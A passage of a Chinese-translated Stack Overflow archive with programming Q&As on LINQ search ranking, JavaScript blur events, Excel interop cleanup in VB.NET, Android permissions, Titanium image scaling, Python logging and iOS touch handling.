    FROM tblProduct
    INNER JOIN tblManufacturer ON tblProduct.ManufacturerID=tblManufacturer.ManufacturerID
    LEFT OUTER JOIN tblProductCollection ON tblProduct.CollectionID=tblProductCollection.CollectionID
    WHERE tblManufacturer.Name + ISNULL(' ' + tblProductCollection.CollectionName, '') + ' ' + tblProduct.Name LIKE '%' + @term + '%'  AND tblProduct.Active = 1
    UNION ALL

    --search product exact name
    SELECT tblProduct.ProductID, 200 AS Ranking
    FROM tblProduct WHERE Name = '%' + term  AND tblProduct.Active = 1
    UNION ALL 
```

此示例说明如果您的搜索词包含在名称中：20 是排名，如果您完全匹配名称：200 是排名。将表格联合在一起，按排名（降序）排序，嘿，快！

这次我正在尝试在 LINQ 中执行此操作，但不确定如何执行此操作，老实说，我不确定我之前的示例是否是最初执行此操作的最佳方法。

因此，我有一个映射到我的数据库的产品实体，并且我在我的部分类中添加了一个名为 SearchRanking 的属性：

```
 var query = from p in db.Products
                    where p.Name.Contains(term)
                    select p;

        var query2 = from p in db.Products
                     where p.Name.ToLower() == term
                     select p; 
```

不知何故，我需要像这样设置属性：

```
 var query = from p in db.Products
                    where p.Name.Contains(term)
                    select p, p.SearchRanking = 20;

        var query2 = from p in db.Products
                     where p.Name.ToLower() == term
                     select p, p.SearchRanking = 200; 
```

我在正确的轨道上吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:38:00.867

我会做这样的事情；

```
 var query = (from p in db.Products
                    where p.Name.Contains(term)
                    select p).ToList().ForEach(p => p.SearchRanking = 20); 
```

一种更有效的方法是；

```
 var query = (from p in db.Products
                    where p.Name.Contains(term)
                    select new Product
                    {
                        Id = p.Id,
                        //set the other props here
                        SearchRanking = 20
                    }).ToList(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:39:20.697

如果你想创建一个新的匿名类型，你可以这样做：

```
 var foundProducts = (from p in products
                                 where p.Name.Contains(term)
                                 select new Product  
                                     {
                                         ProductId = p.ProductId,
                                         Category =  p.Category,
                                         Brand =  p.Brand,
                                         SearchRanking = p.Name.ToLower() == term ? 200 : 20
                                     }).OrderBy(s => s.SearchRanking).Take(20); 
```

# javascript - Javascript，window.addEventListener('blur') 不起作用

> ID：11955774
> 
> 赞同：0
> 
> 时间：2012-08-14T15:30:18.680
> 
> 标签：javascript

我想设置一个超时javascript。

如果浏览器停留在浏览器上，它会重定向到 fallbackLink。

如果浏览器失去焦点，它会超时并且不会重定向到 fallbackLink

这是我的脚本。

```
<script>
(function(){

var fallbackLink = '<?=$info['failed_url']?>'+window.location.search+window.location.hash;

var isiOS = navigator.userAgent.match('iPad') || navigator.userAgent.match('iPhone'),
    isAndroid = navigator.userAgent.match('Android');

if (isiOS) {
  document.getElementById('loader').src = '<?=$info['scheme']?>://'+window.location.search+window.location.hash;
}
var countdown = window.setTimeout(function (){
           window.location.replace(fallbackLink);
    }, 1000);

    window.addEventListener("blur", function(){
                window.clearTimeout(countdown)
    }, false);

  })();
</script> 
```

即使浏览器失去焦点，它也会以某种方式重定向。

当屏幕不关注网络浏览器时，我需要停止重定向。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-21T22:06:52.877

`blur`显然，处理对象事件的唯一方法`window`是使用`window.onblur`. 您可以尝试让旧处理程序这样做：

```
var concatFunctions = function(fn1, fn2){
  return function(){
    var args = Array.prototype.slice.call(arguments, 0);
    try{
      fn1.apply(this, args);
    } catch(err) { console.error(err); }
    fn2.apply(this, args);
  };
};
window.onblur = concatFunction(window.onblur, function(){
  // do your stuff
}); 
```

# direct3d - 在 DXGI 中启用“实时对象警告”

> ID：11955776
> 
> 赞同：1
> 
> 时间：2012-08-14T15:30:39.310
> 
> 标签：direct3d, direct3d11, dxgi

在 Direct3D 11 中，我可以启用“活动对象警告”，例如

```
D3D11: WARNING: Live Texture2D: Name="unnamed", Addr=0x02A16AAC, ExtRef=1, IntRef=0 [ STATE_CREATION WARNING #2097235: LIVE_TEXTURE2D ] 
```

在我的调试版本中检测尚未发布的对象。

我可以为 DXGI 做同样的事情吗？如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-21T03:11:40.393

您可以使用 IDXGIDebug ( [http://msdn.microsoft.com/en-us/library/windows/desktop/hh780351(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/hh780351%28v=vs.85%29.aspx) )

IDXGIDebug 提供了一种称为 ReportLiveObjects 的方法。

# javascript - 替换要翻译的文本

> ID：11955778
> 
> 赞同：0
> 
> 时间：2012-08-14T15:30:51.243
> 
> 标签：javascript, jquery, text, replace

我开了一家网上商店。在结帐页面，我需要替换“您的购物车”字样，因为我会有不同的翻译。我找不到任何改变它的代码。

这是我在 Firebug 中看到的：

```
<table id="v65-cart-moreItems" border="0" align="center" width="96%" cellspacing="0" cellpadding="1">
<h2 class="v65-your-cart-title">Your Cart</h2> 
```

使用 Firebug，我可以检查脚本：

```
<script type="text/javascript">
    function formatCart() {
        jQuery(function () {
            var path = '/a/c/shoppingcart.css';
            if (document.createStyleSheet) {
                document.createStyleSheet(path);
            } else {
                cssTag = '<link rel="stylesheet" type="text/css" href="' + path + '"  />';
                jQuery(document.getElementsByTagName('head')[0]).append(cssTag);
            }
            VJS.v65Cart.Layout.moveRemoveButtons().moveArticleText().dividerAfterItems().swapCheckoutPaths().swapQTYandPrice().moveCouponForm().moveRecalcTotal().addHeader('Your Cart').formatCellSpacing(2).zebraStripes().init();
            if (jQuery('#v65-cart-shipping-details-wrapper').length > 0) {
                VJS.v65Cart.Layout.formatShipping();
            }
        });
    }
    if (typeof jQuery == 'function') {
        if (VJS.v65Toolkit.checkPage('shoppingcart.asp')) {
            var $layoutSettings = jQuery('#v65-layout-mode');
            if ($layoutSettings.length > 0) {
                if ($layoutSettings.attr('data-cart') == 'storedot') {
                    VJS.v65Toolkit.injectTag({
                        'type': 'script',
                        'url': 'a/j/vjs-shoppingcart.js',
                        'callback': formatCart,
                        'cache': false,
                        'node': 'script'
                    });
                }
            }
        }
    }
</script> 
```

请帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:39:00.527

我不熟悉 volusion，但看起来你可以使用 jquery 来定位标题，如下所示：

```
$('.v65-your-cart-title') 
```

只需用 .html('Your new title') 更改它

所以它变成

```
$('.v65-your-cart-title').html('Your new title') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:39:17.920

在这行代码上

```
VJS.v65Cart.Layout.moveRemoveButtons().moveArticleText().dividerAfterItems().swapCheckoutPaths().swapQTYandPrice().moveCouponForm().moveRecalcTotal().addHeader('Your Cart').formatCellSpacing(2).zebraStripes().init(); 
```

方法从一个链接到另一个。这意味着，每个方法都会继续影响同一个对象，因为每个方法都返回对该对象的引用。

这些都是修改`layout`，所以看起来很有希望。此外，在最后，你看到

```
.addHeader('Your Cart') 
```

我建议更新那里的文本以供您翻译。

编辑：如果您找不到代码行，请按`Ctrl`+`F` 并搜索“ *addHeader* ”

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T15:40:00.823

已编辑。这应该这样做。

```
<script type="text/javascript">
    $(function(){
        $('.v65-your-cart-title').text('new text here');
    }
</script> 
```

# vb.net - （另一个）.net Excel 僵尸问题

> ID：11955781
> 
> 赞同：2
> 
> 时间：2012-08-14T15:31:01.753
> 
> 标签：vb.net, excel, excel-interop

我有一个程序在后台留下一个 excel 僵尸进程的问题。我已经遵循了这里和 MSDN 的所有建议和示例，它们试图避免这种情况，但这让我发疯了。谁能发现导致僵尸进程发生的原因？

```
Imports System
Imports System.Collections
Imports System.IO
Imports Excel = Microsoft.Office.Interop.Excel 
```

Private Sub LoadExcelButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) 处理 LoadExcelButton.Click

```
 Dim xlApp As New Excel.Application
    Dim xlBook As Excel.Workbook = Nothing 'instantiated to nothing to help try and avoid zombies
    Dim xlSheet As Excel.Worksheet = Nothing
    Dim STFRange As Excel.Range = Nothing

    Dim Name As String, Easting As Integer, Northing As Integer, tDSpa As Double, Type As String

    Dim NumberSTF As Integer, NumberProperties As Integer, i As Integer, ExcelPath As String

    ExcelPath = Me.ExcelPathTextBox.Text.ToString

    If File.Exists(ExcelPath) = False Then
        MessageBox.Show("Excel file does not exist, exiting.")
        Exit Sub
    End If

    Try

        xlApp.Visible = False

        xlBook = xlApp.Workbooks.Open(ExcelPath) ', , [ReadOnly]:=True

        xlSheet = xlBook.Sheets("STF")

        NumberSTF = xlSheet.UsedRange.Rows.Count - 1 '-1 to account for header
        NumberProperties = xlSheet.UsedRange.Columns.Count

        'create a new collection
        'http://msdn.microsoft.com/en-us/library/xth2y6ft(v=vs.71).aspx
        Dim mySTFCollection As New STFCollection

        For i = 1 To NumberSTF 'rather than a for each loop which would require more excel ranges

            STFRange = xlSheet.Cells(i + 1, 1) '+1 on row to account for header
            Name = STFRange.Value.ToString

            STFRange = xlSheet.Cells(i + 1, 2)
            Easting = CInt(STFRange.Value)

            STFRange = xlSheet.Cells(i + 1, 3)
            Northing = CInt(STFRange.Value)

            STFRange = xlSheet.Cells(i + 1, 4)
            tDSpa = CDbl(STFRange.Value)

            STFRange = xlSheet.Cells(i + 1, 5)
            Type = STFRange.Value.ToString

            Dim objSTF As New STF(Name, Easting, Northing, tDSpa, Type)

            mySTFCollection.Add(objSTF)

        Next i

        GC.Collect()
        GC.WaitForPendingFinalizers()
        GC.Collect()
        GC.WaitForPendingFinalizers()

        ReleaseObject(STFRange)
        STFRange = Nothing
        ReleaseObject(xlSheet)
        xlSheet = Nothing

        xlBook.Close(True, , )
        ReleaseObject(xlBook)
        xlBook = Nothing

        xlApp.Quit()
        ReleaseObject(xlApp)
        xlApp = Nothing

    Catch ex As Exception

        MessageBox.Show(ex.Message)

    End Try
End Sub

Public Sub ReleaseObject(ByVal obj As Object)

    Try
        Marshal.ReleaseComObject(obj)
        obj = Nothing
    Catch ex As Exception
        obj = Nothing
    Finally
        GC.Collect()
    End Try
End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T14:50:42.627

而不是调用`Close()`您的 Excel 应用程序，您尝试过`Dispose()`吗？

您可能想尝试在代码的 finally 块中进行清理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T16:34:47.000

第一件事 第一件事

```
If File.Exists(ExcelPath) = False Then
    MessageBox.Show ("Excel file does not exist, exiting.")
    Exit Sub
End If 
```

应该在`Try - End Try`实例化 Excel 对象之前和之前。如果路径不存在，您将指示代码退出子程序而不进行清理。

2、用`GCcollect`到底。

这是我最喜欢的处理方式

```
Private Sub Button1_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) _
Handles Button1.Click
        '
        '~~> Rest of code
        '

        '~~> Close workbook and quit Excel
        xlWb.Close (False)
        xlApp.Quit()

        '~~> Clean Up
        releaseObject (xlApp)
        releaseObject (xlWb)
End Sub

Private Sub releaseObject(ByVal obj As Object)
    Try
        System.Runtime.InteropServices.Marshal.ReleaseComObject (obj)
        obj = Nothing
    Catch ex As Exception
        obj = Nothing
    Finally
        GC.Collect()
    End Try
End Sub 
```

如果您热衷于 VB.net 的 Excel 自动化，那么我建议您通过此[链接](http://siddharthrout.wordpress.com/vb-net-and-excel/)。

**跟进**

使用此代码。

```
Private Sub LoadExcelButton_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
    Dim Name As String = "", Type As String = "", ExcelPath As String = ""
    Dim Easting As Integer = 0, Northing As Integer = 0
    Dim NumberSTF As Integer = 0, NumberProperties As Integer = 0, i As Integer = 0
    Dim tDSpa As Double = 0

    ExcelPath = Me.ExcelPathTextBox.Text.ToString

    If File.Exists(ExcelPath) = False Then
        MessageBox.Show("Excel file does not exist, exiting.")
        Exit Sub
    End If

    Dim xlApp As New Excel.Application
    Dim xlBook As Excel.Workbook = Nothing
    Dim xlSheet As Excel.Worksheet = Nothing
    Dim STFRange As Excel.Range = Nothing

    xlApp.Visible = True

    xlBook = xlApp.Workbooks.Open(ExcelPath)

    xlSheet = xlBook.Sheets("STF")

    NumberSTF = xlSheet.UsedRange.Rows.Count - 1
    NumberProperties = xlSheet.UsedRange.Columns.Count

    'create a new collection
    'http://msdn.microsoft.com/en-us/library/xth2y6ft(v=vs.71).aspx
    Dim mySTFCollection As New STFCollection

    For i = 1 To NumberSTF

        STFRange = xlSheet.Cells(i + 1, 1)
        Name = STFRange.Value.ToString

        STFRange = xlSheet.Cells(i + 1, 2)
        Easting = CInt(STFRange.Value)

        STFRange = xlSheet.Cells(i + 1, 3)
        Northing = CInt(STFRange.Value)

        STFRange = xlSheet.Cells(i + 1, 4)
        tDSpa = CDbl(STFRange.Value)

        STFRange = xlSheet.Cells(i + 1, 5)
        Type = STFRange.Value.ToString

        Dim objSTF As New STF(Name, Easting, Northing, tDSpa, Type)

        mySTFCollection.Add(objSTF)

    Next i

    '~~> Close the File
    xlBook.Close(False)

    '~~> Quit the Excel Application
    xlApp.Quit()

    '~~> Clean Up
    releaseObject(xlSheet)
    releaseObject(xlBook)
    releaseObject(xlApp)
End Sub

'~~> Release the objects
Private Sub releaseObject(ByVal obj As Object)
    Try
        System.Runtime.InteropServices.Marshal.ReleaseComObject(obj)
        obj = Nothing
    Catch ex As Exception
        obj = Nothing
    Finally
        GC.Collect()
    End Try
End Sub 
```

# android - 为什么我不能使用 Webview 加载我的本地页面

> ID：11955782
> 
> 赞同：0
> 
> 时间：2012-08-14T15:31:03.520
> 
> 标签：android, apache, .htaccess, webview, xampp

我来寻求帮助，我搜索、阅读并尝试了几种我遇到的解决方案，但似乎没有一个对我有用，

我无法从android模拟器访问我的本地网站，使用“http://10.0.2.2”，但我在其他计算机上尝试过，它可以工作，我使用的是Android Webview，它与它有什么关系访问？如何确定哪些 htaccess 设置生效？

顺便说一句，当我尝试使用内置浏览器访问本地页面时，我有什么遗漏的东西让它工作，我可以毫无困难地访问它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:36:11.150

您的清单中有 android.permission.INTERNET 权限吗？有关更多信息，请参阅：http: [//developer.android.com/reference/android/Manifest.permission.html](http://developer.android.com/reference/android/Manifest.permission.html)

# image - 来自远程 URL 的视图和图像的奇怪和不可预测的行为？

> ID：11955783
> 
> 赞同：1
> 
> 时间：2012-08-14T15:31:05.940
> 
> 标签：image, titanium, scrollview, appcelerator, remote-access

这是我的

**APP.js**

```
var win = Ti.UI.createWindow({
    navBarHidden : true,
    className : 'window',
    backgroundColor : "#efefef"
});

var header = Ti.UI.createView({
    height : 20,
    width : 303,
    top : 0,
    backgroundColor : "#abc"
});
win.add(header);

var scroll = Ti.UI.createScrollView({
    top : 44,
    bottom : 44,
    layout : 'vertical'
});
win.add(scroll);
header.addEventListener('click', function(evt) {
    fetch_images();
});

win.open();

function fetch_images() {
    var xhr = Ti.Network.createHTTPClient({
        onload : function() {
            myjson = JSON.parse(this.responseText);
            for ( i = 0; i < myjson.length; i++) {
                Ti.API.debug(i);
                var look = new looks(myjson[i])
                scroll.add(look);
            }
        },
        onerror : function(e) {
            Ti.API.debug("STATUS: " + this.status);
            Ti.API.debug("TEXT:   " + this.responseText);
            Ti.API.debug("ERROR:  " + e.error);
            if (Titanium.Network.online) {
                alert('No reponse from server.');
            } else {
                alert('Please Check your Internet connectivity.');
            }
        },
        timeout : 5000
    });
    xhr.open('GET', 'http://xxxxxxx.com/xxxxxxx.json?api_token=xxxxxxxx');
    xhr.send();
}

function looks(image_details) {
    var look_container = Ti.UI.createView({
        height : 325,
        width : 303,
        top : 10,
        layout : 'horizontal',
        backgroundColor : "#cac"
    });
    var look_image = i.UI.createImageView({
        width : 303,
        top : 0,
        left : 0,
        right : 0,
        image : image_details.image_medium
    });

    look_container.add(look_image);
    return look_container;
} 
```

我正要拔掉我头上的头发。在过去的 4-5 小时内使用它。会计。到代码图像应该是这样的

![在此处输入图像描述](../Images/d5fdeb1cfe504a3a7fb6d2ce946107f7.png)

但它看起来像这样。

![在此处输入图像描述](../Images/a0632b4fdae08dbbe4eaba48eb94ecb8.png)

任何猜测什么是错的！任何帮助将不胜感激？？

根据代码图像应与顶部对齐（距顶部 0px）。但是图像总是在视图中，并且不粘在顶部......？？

**- - - - - - - - - - - - -编辑 - - - - - - - - - - - - ---**

我编辑了我的代码以检查静态 JPG 图像

即使对于资源目录中的图像也是如此

检查这个问题[developer.appcelerator.com/question](http://developer.appcelerator.com/question/141034/how-to-achieve-a-layout-in-a-view-)

**代码**

```
var win = Ti.UI.createWindow({
    navBarHidden : true,
    className : 'window',
    backgroundColor : "#efefef"
});

var my_container = Ti.UI.createView({
    height : 325,
    width : 303,
    top : 30,
    backgroundColor : "#cac",
    layout : "horizontal"
});
var my_image = Ti.UI.createImageView({
    width : '100%',
    top : 0,
    left : 0,
    right : 0,
    image : 'hello.jpg'
});

my_container.add(my_image);
win.add(my_container);

my_container.addEventListener('click', function() {
    my_image.top = my_image.top - 25;
})

win.addEventListener('click', function() {
    my_image.top = my_image.top + 5;
})
win.open(); 
```

和要使用的图像的[图像 url 。](https://i.imgur.com/Y9zvF.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:40:58.950

问题*不在于布局属性*，而是图像缩放！首先请注意，您传递的图像比视图大，因此 Titanium 在工作表下进行了一些缩放。

因此，当您定义 that 的宽度时`ImageView`，如果您传递的图像大于视图，Titanium 会使用自己的机制对其进行缩放，这显然不是您想要的，因为过去它一直让您扯掉头发几天。我相信他们会从下向上缩放图像，从而导致您出现奇怪的问题。

要解决此问题，您需要控制 Titanium 中的图像缩放，并传递一个新的、调整大小的图像

为此，我们需要获取图像的原始高度和宽度，以保持纵横比，然后计算出新的大小，调整图像大小，并将其传递给 imageView。

要获得图像的高度和宽度，您必须稍微修改一下，以下是我使用 SDK 2.1.1.GA 的方法：

**获取 Blob / 图像的高度和宽度**

```
// Load the image as a blob to get height information
var imageFile = Ti.Filesystem.getFile('hello.png');
var blobOfImage = imageFile.read();

// Put it in a imageView, since It wont let me get height from a blob for some reason
var imageView1 = Titanium.UI.createImageView({
    image: blobOfImage,
    width: 'auto',
    height: 'auto',
});

// This is the important part, toImage this view and you get the height and width of this image
// For some reason we cant get this from a Blob in SDK 2.1.1.GA
var heightOfImage = imageView1.toImage().height;
var widthOfImage = imageView1.toImage().width; 
```

现在我们计算宽度的纵横比（iPhone 的屏幕尺寸为 320）。

**纵横比**

```
var aspectRatio =  heightOfImage / widthOfImage; 
```

现在我们可以在 imageview 中创建新的调整大小的图像。

**新图片！**

```
var my_container = Ti.UI.createView({
    height : 325,
    width : 303,
    top : 30,
    backgroundColor : "#cac",
    layout : "horizontal"
});
var my_image = Ti.UI.createImageView({
    top : 0,
    left : 0,
    right : 0,
    image : blobOfImage.imageAsResized(320, 320*aspectRatio) // Note the resize call to the image blob
}); 
```

这是最终输出：

![截屏](../Images/bac79ea4901a20a9e249c61e400f2ef5.png)

所以我想这个教训是不要相信 Titanium 会为你缩放你的图像。

# asp.net - 用于 ASP.NET Web API 服务的 Windows Server AppFabric 监控

> ID：11955784
> 
> 赞同：1
> 
> 时间：2012-08-14T15:31:07.167
> 
> 标签：asp.net, asp.net-web-api, appfabric

我一直在寻找这个问题的答案，所以我现在转向这个社区寻找以下问题的答案：

是否可以使用 .NET 4.5 RC 为 ASP.NET Web API（不是 WCF）RESTful 服务启用 Windows Server AppFabric 监控？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-16T14:41:28.447

看看[http://visualstudiogallery.msdn.microsoft.com/a685f193-ed1e-4ad4-938f-f0bd8212d53d](http://visualstudiogallery.msdn.microsoft.com/a685f193-ed1e-4ad4-938f-f0bd8212d53d)

应该能帮到你。

# python - 惯用的 Python 日志记录：格式字符串 + args 列表与内联字符串格式 - 哪个是首选？

> ID：11955787
> 
> 赞同：18
> 
> 时间：2012-08-14T15:31:13.690
> 
> 标签：python, logging, coding-style, idioms

使用格式字符串 + args 列表调用日志函数与内联格式化是否有利？

我已经看到（并编写了）使用内联字符串格式的日志记录代码：

```
logging.warn("%s %s %s" % (arg1, arg2, arg3)) 
```

但我认为使用*更好*（性能方面，更惯用）：

```
logging.warn("%s %s %s", arg1, arg2, arg3) 
```

因为第二种形式在调用日志记录函数之前避免了字符串格式化操作。如果当前日志级别会过滤掉日志消息，则无需格式化，从而减少计算时间和内存分配。

我在正确的轨道上，还是我错过了什么？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-08-14T15:39:04.963

恕我直言，对于很可能会显示的消息，例如那些给予`error`或`warn`没有太大区别的消息。

对于不太可能显示的消息，我肯定会选择第二个版本，主要是出于性能原因。我经常将大对象作为参数传递给`info`，它实现了一种代价高昂的`__str__`方法。显然，发送这个预先格式化的文件`info`会浪费性能。

**更新**

我刚刚检查了`logging`模块的源代码，实际上，格式化是*在*检查日志级别后完成的。例如：

```
class Logger(Filterer):
    # snip
    def debug(self, msg, *args, **kwargs):
        # snip
        if self.isenabledfor(debug):
            self._log(debug, msg, args, **kwargs) 
```

可以观察到这一点，`msg`并且在调用和检查日志级别`args`之间保持不变。`log`

**更新 2**

受 Levon 的启发，让我为具有昂贵`__str__`方法的对象添加一些测试：

```
$ python -m timeit -n 1000000 -s "import logging" -s "logger = logging.getLogger('foo')" -s "logger.setLevel(logging.ERROR)" "logger.warn('%s', range(0,100))"
1000000 loops, best of 3: 1.52 usec per loop
$ python -m timeit -n 1000000 -s "import logging" -s "logger = logging.getLogger('foo')" -s "logger.setLevel(logging.ERROR)" "logger.warn('%s' % range(0,100))"
1000000 loops, best of 3: 10.4 usec per loop 
```

在实践中，这可以提供相当高的性能提升。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-08-14T15:33:23.710

如果这有帮助，这里是对两个格式化选项的快速时序测试：

```
In [61]: arg1='hello'
In [62]: arg2='this'
In [63]: arg3='is a test'

In [70]: timeit -n 10000000 "%s %s %s" % (arg1, arg2, arg3)
10000000 loops, best of 3: 284 ns per loop

In [71]: timeit -n 10000000  "%s %s %s", arg1, arg2, arg3
10000000 loops, best of 3: 119 ns per loop 
```

似乎给第二种方法带来了优势。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-08-14T16:11:14.053

如果当前的日志记录级别过滤了日志消息（如我所料），那么避免内联字符串格式确实可以节省一些时间——但不会太多：

```
In [1]: import logging

In [2]: logger = logging.getLogger('foo')

In [3]: logger.setLevel(logging.ERROR)

In [4]: %timeit -n 1000000 logger.warn('%s %s %s' % ('a', 'b', 'c'))
1000000 loops, best of 3: 1.09 us per loop

In [12]: %timeit -n 1000000 logger.warn('%s %s %s', 'a', 'b', 'c')
1000000 loops, best of 3: 946 ns per loop 
```

因此，正如[user1202136 指出](https://stackoverflow.com/a/11955929/1309774)的那样，整体性能差异取决于格式化字符串所需的时间（这可能很重要，具体取决于调用`__str__`传递给日志记录函数的参数的成本。）

# ruby - ruby 字符串中的 #{} 实际上有什么作用？

> ID：11955792
> 
> 赞同：2
> 
> 时间：2012-08-14T15:31:35.557
> 
> 标签：ruby, string

正如问题所问，它只是调用`to_s`嵌入表达式的返回值吗？

像这样？

```
"1, 2, #{1 + 2}" == "1, 2, " + 3.to_s 
```

还是这里有更多的事情发生？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-14T15:43:03.377

是的，它调用`to_s`表达式的结果。尝试一下。

```
:001> class Monkey
:002>   def to_s
:003>     "monkey"
:004>     end
:005>   end
 => nil 
:006> m = Monkey.new
 => monkey
:007> "I am a #{m}"
 => "I am a monkey" 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-14T15:43:15.273

它实际上只是一个占位符，“嘿，这里有一些 ruby​​ 代码需要评估并转换为字符串。” 如果您完全熟悉 C 风格的语言，那么它与以下内容几乎相同：

```
printf("1, 2, %d", 1+2); 
```

# iphone - 将触摸传递给下一个响应者或其他子视图 iOS

> ID：11955803
> 
> 赞同：5
> 
> 时间：2012-08-14T15:32:07.777
> 
> 标签：iphone, objective-c, uiview, uiimageview, touch

我确信这个问题会很容易解决，但是我对 iOS 开发还比较陌生。我正在尝试将触摸事件传递给 UIView 上绘制顺序较低的孩子。例如 -

我创建扩展 UIImageView 来创建我的 MoveableImage 类。这个类基本上就是 UIImageView，它实现了 touchesBegan、touchesEnded 和 touchesMoved-

```
-(void) touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event
{

[self showFrame];

//if multitouch dont move
if([[event allTouches]count] > 1)
{
    return;
}

    UITouch *touch = [[event touchesForView:self] anyObject ];

    // Animate the first touch
    CGPoint colorPoint = [touch locationInView:self];

    CGPoint touchPoint = [touch locationInView:self.superview];

    //if color is alpha of 0 , they are touching the frame and bubble to next responder
    UIColor *color = [self colorOfPoint:colorPoint];
    [color getRed:NULL green:NULL blue:NULL alpha:&touchBeganAlpha];
    NSLog(@"alpha : %f",touchBeganAlpha);

    if(touchBeganAlpha > 0)
    {
          [self animateFirstTouchAtPoint:touchPoint];
    }
    else {
        [super.nextResponder touchesBegan:touches withEvent:event];
    }

} 
```

所以最终的结果基本上是这样的——如果他们触摸的是 imageView 的框架，而不是下面的另一个图像中的图像，则可能会做出响应。有关示例，请参见此图像。

![将触摸传递到下视图](../Images/c9aa63a5ac3f2a816355d32743e1d6af.png)

到目前为止，我已经尝试了下一个响应者，但这并不能解决问题。任何帮助将不胜感激！

已解决 - 我停止检查 touchesBegan 和 touchesMoved 上的 alpha。Ovveriding pointInside 允许 UIView 为我处理。

```
-(BOOL) pointInside:(CGPoint)point withEvent:(UIEvent *) event
{
  BOOL superResult = [super pointInside:point withEvent:event];
  if(!superResult)
  {
   return superResult;
  }

  if(CGPointEqualToPoint(point, self.previousTouchPoint))
  {
     return self.previousTouchHitTestResponse;
  }else{
     self.previousTouchPoint = point;
  }

  BOOL response = NO;

  //if image is nil then return yes and fall back to super
  if(self.image == nil)
   {
     response = YES;
   }

  response = [self isAlphaVisibleAtPoint:point];
  self.previousTouchHitTestResponse = response;
  return response;

} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-14T15:52:42.717

您可以为 UIImageView 的子类覆盖替代`- (BOOL)pointInside:(CGPoint)point withEvent:(UIEvent *)event`方法。（是uiview的每个子类都可以覆盖的方法）

UIView 使用这个方法`hitTest:withEvent:`来确定哪个子视图应该接收触摸事件。如果 pointInside:withEvent: 返回 YES，则遍历子视图的层次结构；否则，其视图层次结构的分支将被忽略。

[查看OBShapedButton](https://github.com/ole/OBShapedButton)的 github 上的源代码。他们只为按钮的不透明部分处理点击事件。

# android - 地图不工作

> ID：11955804
> 
> 赞同：1
> 
> 时间：2012-08-14T15:32:09.303
> 
> 标签：android, google-maps

.我有简单的地图应用程序。首先我的地图正在工作。然后我允许开发我的应用程序我强制关闭。当我运行我的应用程序时出现以下错误：

```
08-14 20:57:26.855: E/AndroidRuntime(207): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.mapss/com.example.mapss.MainActivity}: java.lang.SecurityException: Requires ACCESS_FINE_LOCATION permission
08-14 20:57:26.855: E/AndroidRuntime(207):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2401)
08-14 20:57:26.855: E/AndroidRuntime(207):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2417)
08-14 20:57:26.855: E/AndroidRuntime(207):  at android.app.ActivityThread.access$2100(ActivityThread.java:116)
08-14 20:57:26.855: E/AndroidRuntime(207):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1794)
08-14 20:57:26.855: E/AndroidRuntime(207):  at android.os.Handler.dispatchMessage(Handler.java:99)
08-14 20:57:26.855: E/AndroidRuntime(207):  at android.os.Looper.loop(Looper.java:123)
08-14 20:57:26.855: E/AndroidRuntime(207):  at android.app.ActivityThread.main(ActivityThread.java:4203)
08-14 20:57:26.855: E/AndroidRuntime(207):  at java.lang.reflect.Method.invokeNative(Native Method)
08-14 20:57:26.855: E/AndroidRuntime(207):  at java.lang.reflect.Method.invoke(Method.java:521)
08-14 20:57:26.855: E/AndroidRuntime(207):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:791)
08-14 20:57:26.855: E/AndroidRuntime(207):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:549)
08-14 20:57:26.855: E/AndroidRuntime(207):  at dalvik.system.NativeStart.main(Native Method)
08-14 20:57:26.855: E/AndroidRuntime(207): Caused by: java.lang.SecurityException: Requires ACCESS_FINE_LOCATION permission
08-14 20:57:26.855: E/AndroidRuntime(207):  at android.os.Parcel.readException(Parcel.java:1218)
08-14 20:57:26.855: E/AndroidRuntime(207):  at android.os.Parcel.readException(Parcel.java:1206)
08-14 20:57:26.855: E/AndroidRuntime(207):  at android.location.ILocationManager$Stub$Proxy.getLastKnownLocation(ILocationManager.java:776)
08-14 20:57:26.855: E/AndroidRuntime(207):  at android.location.LocationManager.getLastKnownLocation(LocationManager.java:945)
08-14 20:57:26.855: E/AndroidRuntime(207):  at com.example.mapss.MainActivity.onCreate(MainActivity.java:36)
08-14 20:57:26.855: E/AndroidRuntime(207):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1123)
08-14 20:57:26.855: E/AndroidRuntime(207):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2364)
08-14 20:57:26.855: E/AndroidRuntime(207):  ... 11 more 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:37:47.877

将此行添加到您的`AndroidManifest.xml`

```
 <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:48:42.907

